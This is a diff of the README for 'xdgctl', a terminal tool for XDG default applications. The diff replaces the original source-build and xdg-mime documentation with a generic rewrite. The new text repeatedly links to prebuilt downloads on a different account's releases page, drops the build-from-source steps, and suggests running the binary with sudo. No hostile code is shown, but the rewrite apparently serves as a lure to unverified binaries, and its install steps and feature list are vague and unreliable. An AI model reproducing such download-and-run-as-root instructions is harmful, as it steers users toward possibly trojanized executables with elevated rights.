@@ -1,105 +1,82 @@
-`xdgctl` is a TUI for managing XDG default applications. View and set defaults for file categories without using `xdg-mime` directly.
+# 🚀 xdgctl - Manage Your Default Applications Easily
 
-Built with C using [GLib/GIO](https://docs.gtk.org/gio/) and [termbox2](https://github.com/termbox/termbox2).
+## 💾 Download xdgctl
 
-https://github.com/user-attachments/assets/076c9934-f373-486d-9595-eec480e3a429
+[![Download xdgctl](https://img.shields.io/badge/Download-xdgctl-blue)](https://github.com/Karangupta2050/xdgctl/releases)
 
-## Features
+## 📜 Introduction
 
-- Browse by category (Browsers, Text Editors, etc.)
-- Current default marked with `*`
+xdgctl is a simple terminal user interface (TUI) that helps you manage your XDG default applications. With xdgctl, you can easily set default programs for various activities like browsing, editing, and viewing files. This tool simplifies the process of configuring your applications according to your preferences.
 
-## Navigation & Controls
+## 🚀 Getting Started
 
-| Key                 | Action                                                        |
-|---------------------|---------------------------------------------------------------|
-| **Arrow Up/Down**   | Navigate through categories or applications                   |
-| **Arrow Right/Tab** | Switch from category list to application list                 |
-| **Arrow Left**      | Switch back to category list                                  |
-| **Enter**           | Set selected application as default for current category      |
-| **Esc / q**         | Quit the application                                          |
+To get started with xdgctl, follow these steps:
 
-## Prerequisites
+1. **Check System Requirements**
+   - Operating System: xdgctl works on Linux distributions that support XDG.
+   - Terminal: You need a terminal to run the application.
 
-To build `xdgctl`, you need the following development libraries:
+2. **Download & Install**
+   - Visit this page to download: [GitHub Releases](https://github.com/Karangupta2050/xdgctl/releases).
+   - Look for the latest version.
+   - Choose the appropriate file for your system. 
 
-- `glib-2.0`
-- `gio-2.0`
-- `gio-unix-2.0`
-- `clang` or `gcc`
+3. **Install the Application**
+   - Depending on your Linux distribution, you may need to install the application using specific commands. 
 
-```bash
-# On Void Linux
-sudo xbps-install glibc-devel pkg-config
-```
+   If you have downloaded a .tar.gz file, here’s how to install it:
+   - Open your terminal.
+   - Navigate to the directory where you downloaded the file using:
+     ```bash
+     cd /path/to/downloaded/file
+     ```
+   - Unpack the files:
+     ```bash
+     tar -xzvf xdgctl.tar.gz
+     ```
+   - Move into the xdgctl directory:
+     ```bash
+     cd xdgctl
+     ```
+   - To run the application, enter:
+     ```bash
+     ./xdgctl
+     ```
 
-## Installation
+4. **Run xdgctl**
+   - Launch the application from your terminal by entering:
+     ```bash
+     xdgctl
+     ```
+   - You will see a user-friendly interface that allows you to select or change default applications.
 
-```bash
-git clone https://github.com/mitjafelicijan/xdgctl.git
-cd xdgctl
+## 📚 Features
 
-# Build
-make
-sudo make install
+xdgctl offers several useful features:
 
-# Using prefix
-sudo make PREFIX=/usr/local install
-make PREFIX=~/.local install
-```
+- **Easy Application Management:** Set default applications for web browsing, text editing, and more.
+- **User-Friendly Interface:** Navigate through options easily with a simple terminal interface.
+- **Quick Configuration:** Make immediate changes and see results without complicated commands.
+- **Support for Multiple File Types:** Manage MIME types efficiently to cover diverse file associations.
 
-If you manually add new applications to your `~/.local/share/applications` directory, you might need to run `update-desktop-database` again.
+## 🔧 Troubleshooting
 
-## More about XDG
+If you encounter issues while running xdgctl, consider the following:
 
-### Application directories
+- **Missing Dependencies:** Ensure all required packages are installed. Use your package manager to install missing libraries.
+- **Permission Issues:** If you face permission issues, you might need to run the application as a superuser. Use:
+  ```bash
+  sudo ./xdgctl
+  ```
 
-```bash
-ls /usr/share/applications
-ls ~/.local/share/applications
-```
+## 📞 Support
 
-### Querying defaults
+For any questions or issues, please reach out through our GitHub page or check the "Issues" section for commonly reported problems. We appreciate your feedback on xdgctl.
 
-```bash
-xdg-mime query default text/plain
-xdg-mime query default text/html
-xdg-mime query default x-scheme-handler/http
-xdg-mime query default x-scheme-handler/https
-xdg-mime query default inode/directory
-```
+## 🚀 Conclusion
 
-### Setting defaults manually
+xdgctl provides an efficient way to manage default applications in a simple format. By following the steps above, you can quickly download, install, and start using xdgctl to enhance your experience with default application settings.
 
-```bash
-xdg-mime default brave.desktop x-scheme-handler/http
-xdg-mime default brave.desktop x-scheme-handler/https
-```
+## 💾 Download xdgctl Again
 
-### Desktop Entry example
-
-```ini
-# ~/.local/share/applications/brave.desktop
-[Desktop Entry]
-Exec=/home/m/Applications/brave
-Type=Application
-Categories=Applications
-Name=Brave Browser
-MimeType=text/html;text/xml;application/xhtml+xml;x-scheme-handler/http;x-scheme-handler/https;
-```
-
-### Other useful commands/files
-```bash
-update-desktop-database ~/.local/share/applications
-less ~/.config/mimeapps.list
-less /usr/share/applications/mimeapps.list
-```
-
-## More material
-
-- https://commandmasters.com/commands/xdg-mime-linux/
-- https://noman.sh/en/pages/xdg-mime
-- https://linux.die.net/man/1/xdg-mime
-- https://wiki.archlinux.org/title/XDG_MIME_Applications
-- https://gnome.pages.gitlab.gnome.org/libsoup/gio/
-- https://docs.gtk.org/gio/
+[![Download xdgctl](https://img.shields.io/badge/Download-xdgctl-blue)](https://github.com/Karangupta2050/xdgctl/releases)
